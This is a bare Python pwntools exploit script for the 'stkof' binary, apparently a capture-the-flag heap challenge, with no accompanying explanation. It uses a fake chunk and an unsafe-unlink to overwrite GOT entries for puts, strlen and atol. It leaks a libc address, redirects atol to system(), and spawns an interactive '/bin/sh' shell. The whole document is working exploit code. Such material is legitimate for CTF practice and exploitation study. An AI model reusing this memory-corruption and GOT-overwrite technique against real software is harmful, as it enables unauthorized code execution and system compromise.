#!/usr/bin/python
#from pwn import *
from pwn13 import *

puts_got = 0x602020
printf_got = 0x602040
printf_plt = 0x4007a6
strlen_got = 0x602030
stdin_next = 0x6020e0
atol_got = 0x602080
chunk4 = 0x602160

def ALLOC(size):
    p.sendline("1")
    p.sendline(str(size))
    print p.recvline()[:-1]
    print p.recvline()[:-1]

def UPDATE(index, data):
    p.sendline("2")
    p.sendline(str(index))
    p.sendline(str(len(data)))
    p.send(data)
    print p.recvline()[:-1]

def DELETE(index):
    p.sendline("3")
    p.sendline(str(index))
    print p.recvline()[:-1]

def PRINT(index):
    p.sendline("4")
    p.sendline(str(index))
    data = p.recvuntil("OK")
    print data
    return data

def leak():

    ALLOC(0x80)
    ALLOC(0x80)
    ALLOC(0x80)
    ALLOC(0x80)
    ALLOC(0x80)
    ALLOC(0x80)

    #
    payload = p64(0)*17 + p64(0x91) + p64(0)*2 + p64(chunk4-0x18) + p64(chunk4-0x10)
    payload += p64(0)*12 + p64(0x80) + p64(0x90)
    UPDATE(3, payload)

    DELETE(5)
    #
    payload = p64(puts_got) + p64(strlen_got) + p64(atol_got)
    UPDATE(4, payload)
    p.dump(0x602000,0x500)
    p.heap(0x1480,0x700)

    UPDATE(2, p64(printf_plt))

    addr = PRINT(1)[:6]
    puts_plt = u64(addr+"\x00"*2)
    libc_base = puts_plt - 0x6f690
    print 'libc base', hex(libc_base)
    return libc_base

if __name__ == "__main__":
    p = process("./stkof")

    libc_base = leak()
    system_addr = libc_base + 0x45390

    UPDATE(3, p64(system_addr))

    PRINT("/bin/sh")

    p.interactive()
    p.close()
